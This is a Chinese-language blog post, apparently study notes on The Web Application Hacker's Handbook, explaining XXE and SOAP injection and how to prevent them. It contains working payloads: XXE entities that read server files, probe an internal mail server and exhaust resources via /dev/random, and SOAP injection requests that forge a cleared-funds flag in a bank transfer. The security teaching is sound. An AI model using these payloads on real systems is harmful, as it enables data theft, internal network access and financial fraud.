---
layout:     post
title:      Chapter 10 Attacking Back-End Components(3)-Injecting into XML Interpreters
subtitle:   注入XML解释器
date:       2020-03-16
author:     D
header-img: 
catalog: true
mermaid: true
tags: [web hacking]
---

参考:**The Web Application Hackers Handbook** Chapter 10

XML在当今的Web应用程序中得到广泛使用，在浏览器和前端应用程序服务器之间的请求和响应以及在后端应用程序组件（例如SOAP服务）之间的消息中都广泛使用XML。 这两个位置都容易受到攻击，从而使用精心设计的输入来干扰应用程序的操作并通常执行一些未经授权的操作。

# 1.注入XML外部实体(Injecting XML External Entities)

在当今的网络应用程序中，XML通常用于将数据从客户端提交到服务器。 然后，服务器端应用程序将对此数据进行操作，并可能返回包含XML或任何其他格式的数据的响应。 此行为最常见于基于Ajax的应用程序中，在该应用程序中，异步请求用于在后台进行通信。 它也可以出现在浏览器扩展组件和其他客户端技术的上下文中。

例如，考虑使用Ajax实现搜索功能以提供无缝的用户体验。 当用户输入搜索词时，客户端脚本会向服务器发出以下请求：
```
POST /search/128/AjaxSearch.ashx HTTP/1.1
Host: mdsec.net
Content-Type: text/xml; charset=UTF-8
Content-Length: 44

<Search><SearchTerm>nothing will change</SearchTerm></Search>
```
服务器的响应如下（尽管可能存在漏洞，无论响应中使用的格式如何）：
```
HTTP/1.1 200 OK
Content-Type: text/xml; charset=utf-8
Content-Length: 81

<Search><SearchResult>No results found for expression: nothing will
change</SearchResult></Search>
```
客户端脚本处理该响应，并使用搜索结果更新部分用户界面。

遇到此类功能时，应始终检查XML外部实体（XXE）注入。 出现此漏洞的原因是标准XML解析库支持实体引用的使用。 这些只是引用XML文档内部或外部数据的一种方法。 实体引用应该从其他上下文中熟悉。 例如，与<和>字符相对应的实体如下：
```
&lt;
&gt;
```
XML格式允许在XML文档本身内定义自定义实体。 这是在文档开头的可选DOCTYPE元素内完成的。 例如：
```
<!DOCTYPE foo [ <!ENTITY testref "testrefvalue" > ]>
```
如果文档包含此定义，则解析器将替换出现的`＆testref;`具有定义值`testrefvalue`的文档中的实体引用。

此外，XML规范允许使用外部引用来定义实体，外部引用的值由XML解析器动态获取。 这些外部实体定义使用URL格式，并且可以引用本地文件系统上的外部Web URL或资源。 XML解析器获取指定的URL或文件的内容，并将其用作所定义实体的值。 如果应用程序在响应中返回使用外部定义的实体的XML数据的任何部分，则响应中将返回指定文件或URL的内容。

可以通过在攻击者基于XML的请求中指定外部实体，方法是在XML中添加合适的`DOCTYPE`元素（或者如果该元素已经存在，则可以对其进行修改）。 外部实体引用是使用`SYSTEM`关键字指定的，其定义是可以使用`file:`协议的URL。

在前面的示例中，攻击者可以提交以下请求，该请求定义了引用服务器文件系统上文件的XML外部实体：
```
POST /search/128/AjaxSearch.ashx HTTP/1.1
Host: mdsec.net
Content-Type: text/xml; charset=UTF-8
Content-Length: 115

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///windows/win.ini" > ]>
<Search><SearchTerm>&xxe;</SearchTerm></Search>
```
这导致XML解析器获取指定文件的内容，并使用它代替攻击者在`SearchTerm`元素中使用的定义的实体引用。 由于此元素的值在应用程序的响应中回显，因此导致服务器使用文件的内容进行响应，如下所示：
```
HTTP/1.1 200 OK
Content-Type: text/xml; charset=utf-8
Content-Length: 556

<Search><SearchResult>No results found for expression: ; for 16-bit app
support
 [fonts]
 [extensions]
 [mci extensions]
 [files]
...
```
除了使用`file:`协议在本地文件系统上指定资源外，攻击者还可以使用诸如`http:`的协议来使服务器跨网络获取资源。 这些URL可以指定任意主机，IP地址和端口。 它们可能允许攻击者与无法从Internet直接访问的后端系统上的网络服务进行交互。 例如，以下攻击尝试连接到在私有IP地址192.168.1.1的端口25上运行的邮件服务器：
```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://192.168.1.1:25" > ]>
<Search><SearchTerm>&xxe;</SearchTerm></Search>
```
此技术可能允许执行各种攻击：
- 攻击者可以将应用程序用作代理，从应用程序可以访问的任何Web服务器中检索敏感内容，包括在组织内部内部运行的，不可路由的私有地址空间上的敏感内容。
- 攻击者可以利用后端Web应用程序上的漏洞，前提是可以通过URL利用这些漏洞。
- 攻击者可以通过循环访问大量IP地址和端口号来测试后端系统上的开放端口。 在某些情况下，时序差异可用于推断请求端口的状态。 在其他情况下，某些服务的服务横幅实际上可能会在应用程序的响应中返回。

最后，如果应用程序检索了外部实体，但未在响应中返回此外部实体，则仍然可能会通过无限期地读取文件流而导致拒绝服务。 例如：
```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM " file:///dev/random"> ]>
```

# 2.注入SOAP服务(Injecting into SOAP Services)

简单对象访问协议（SOAP）是一种基于消息的通信技术，使用XML格式封装数据。 即使它们运行在不同的操作系统和体系结构上，它也可以用于在系统之间共享信息和传输消息。 它的主要用途是在Web服务中。 在浏览器访问的Web应用程序的上下文中，您很可能在后端应用程序组件之间发生的通信中遇到SOAP。

SOAP通常用于大型企业应用程序中，其中不同计算机执行单独的任务以提高性能。 还经常发现在哪里将Web应用程序部署为现有应用程序的前端。 在这种情况下，可以使用SOAP来实现不同组件之间的通信，以确保模块化和互操作性。

因为XML是一种解释型语言，所以SOAP可能容易受到代码注入的攻击，其方式与已经描述的其他示例类似。 XML元素使用元字符`<`，`>`和`/`语法表示。 如果将包含这些字符的用户提供的数据直接插入SOAP消息中，则攻击者可能会干扰消息的结构，从而干扰应用程序的逻辑或引起其他不良后果。

考虑一个银行应用程序，其中用户使用HTTP请求启动资金转帐，如下所示：
```
POST /bank/27/Default.aspx HTTP/1.0
Host: mdsec.net
Content-Length: 65

FromAccount=18281008&Amount=1430&ToAccount=08447656&Submit=Submit
```
在处理此请求的过程中，以下SOAP消息在应用程序的两个后端组件之间发送：
```
<soap:Envelope xmlns:soap="http://www.w3.org/2001/12/soap-envelope">
	<soap:Body>
		<pre:Add xmlns:pre=http://target/lists soap:encodingStyle="http://www.w3.org/2001/12/soap-encoding">
			<Account>
				<FromAccount>18281008</FromAccount>
				<Amount>1430</Amount>
				<ClearedFunds>False</ClearedFunds>
				<ToAccount>08447656</ToAccount>
			</Account>
		</pre:Add>
	</soap:Body>
</soap:Envelope>
```
注意消息中的XML元素如何与HTTP请求中的参数相对应，以及`ClearedFunds`元素的添加。 在应用程序逻辑的这一点上，它确定没有足够的资金来执行请求的转帐，并将此元素的值设置为`False`。 结果，接收SOAP消息的组件不会对其起作用。

在这种情况下，您可以通过多种方式尝试将其注入SOAP消息，从而干扰应用程序的逻辑。 例如，提交以下请求会使附加的`ClearedFunds`元素插入到原始元素之前的消息中（同时保留SQL的语法有效性）。 如果应用程序处理遇到的第一个`ClearedFunds`元素，则在没有可用资金时，您可能会成功执行转帐：
```
POST /bank/27/Default.aspx HTTP/1.0
Host: mdsec.net
Content-Length: 119

FromAccount=18281008&Amount=1430</Amount><ClearedFunds>True
</ClearedFunds><Amount>1430&ToAccount=08447656&Submit=Submit
```
另一方面，如果应用程序处理它遇到的最后一个`ClearedFunds`元素，则可以向`ToAccount`参数注入类似的攻击。

另一种攻击类型是使用XML注释删除原始SOAP消息的一部分，并用您自己的元素替换删除的元素。 例如，以下请求通过`Amount`参数注入ClearedFunds元素，为ToAccount元素提供开始标签，打开注释，并在ToAccount参数中关闭注释，从而保留XML的语法有效性：
```
POST /bank/27/Default.aspx HTTP/1.0
Host: mdsec.net
Content-Length: 125

FromAccount=18281008&Amount=1430</Amount><ClearedFunds>True
</ClearedFunds><ToAccount><!--&ToAccount=-->08447656&Submit=Submit
```
另一种攻击类型是尝试从注入的参数中完成整个SOAP消息，并注释掉消息的其余部分。 但是，由于开头的注释不会与结尾的注释匹配，因此这种攻击会产生严格无效的XML，许多XML解析器将拒绝该XML。 此攻击仅可能针对自定义的本地XML解析器，而不是任何XML解析库：
```
POST /bank/27/Default.aspx HTTP/1.0
Host: mdsec.net
Content-Length: 176

FromAccount=18281008&Amount=1430</Amount><ClearedFunds>True
</ClearedFunds>
<ToAccount>08447656</ToAccount></Account></pre:Add></soap:Body>
</soap:Envelope>
<!--&Submit=Submit
```

# 3.查找和利用SOAP注入(Finding and Exploiting SOAP Injection)

SOAP注入可能很难检测，因为以非精心设计的方式提供XML元字符会破坏SOAP消息的格式，通常会导致错误的错误消息。 但是，可以使用以下步骤来以一定程度的可靠性来检测SOAP注入漏洞。

**HACK STEPS**<br>
- 1.依次在每个参数中提交流氓XML结束标记，例如`</foo>`。 如果没有错误发生，则可能是您的输入未插入SOAP消息中，或者已通过某种方式进行了清理。
- 2.如果收到错误，请提交有效的开始和结束标记对，例如`<foo>` `</foo>`。 如果这导致错误消失，则该应用程序可能很容易受到攻击。
- 3.在某些情况下，随后将从XML格式的消息中读取插入到XML格式的消息中的数据，并将其返回给用户。 如果您正在修改的项目正在应用程序的响应中返回，请查看您提交的任何XML内容是以相同的形式返回还是已通过某种方式规范化。 依次提交以下两个值：
```
test<foo/>
test<foo></foo>
```
如果您发现任何一项都作为另一项或简单地作为测试返回，您可以确信您的输入已插入到基于XML的消息中。
- 4.如果HTTP请求包含可能放置在SOAP消息中的多个参数，请尝试将开始注释字符（`<!--`）插入一个参数，将结束注释字符（`!-->`）插入另一参数。 然后将其切换（因为您无法知道参数的显示顺序）。 这样做可能会注释掉服务器的一部分SOAP消息。 这可能会导致应用程序逻辑发生更改，或导致其他错误情况，从而可能泄露信息。

如果很难检测到SOAP注入，则可能更难利用。 在大多数情况下，您需要了解围绕数据的XML的结构，以提供可修改消息而不会使其无效的精巧输入。 在前面的所有测试中，查找任何错误消息，这些错误消息将揭示有关正在处理的SOAP消息的所有详细信息。 如果幸运的话，一条冗长的消息将泄露整个消息，使您能够构建精心设计的价值以利用此漏洞。 如果您不走运，您可能会被限制于纯粹的猜测工作，而这不太可能成功。

# 4.防止SOAP注入(Preventing SOAP Injection)

您可以通过在用户提供的数据插入到SOAP消息中的任何位置使用边界验证过滤器来防止SOAP注入（请参见第2章）。 这应该在当前请求中立即从用户接收的数据上执行，也应在先前请求中持久保存的数据上或从以用户数据作为输入的其他处理中生成的任何数据上执行。

为了防止所描述的攻击，应用程序应该对用户输入中出现的所有XML元字符进行HTML编码。 HTML编码涉及将文字字符替换为其相应的HTML实体。 这样可以确保XML解释器将它们视为相关元素的数据值的一部分，而不是消息本身的结构的一部分。 以下是一些常见问题字符的HTML编码：
- `<` - `&lt;`
- `>` - `&gt;`
- `/` - `&#47;`

[Chapter 10 Attacking Back-End Components(2)-Manipulating File Paths](https://dm116.github.io/2020/03/16/attacking-back-end-components_2/)<br>
[Chapter 10 Attacking Back-End Components(4)-Injecting into Back-end HTTP Requests](https://dm116.github.io/2020/03/16/attacking-back-end-components_4/)<br>
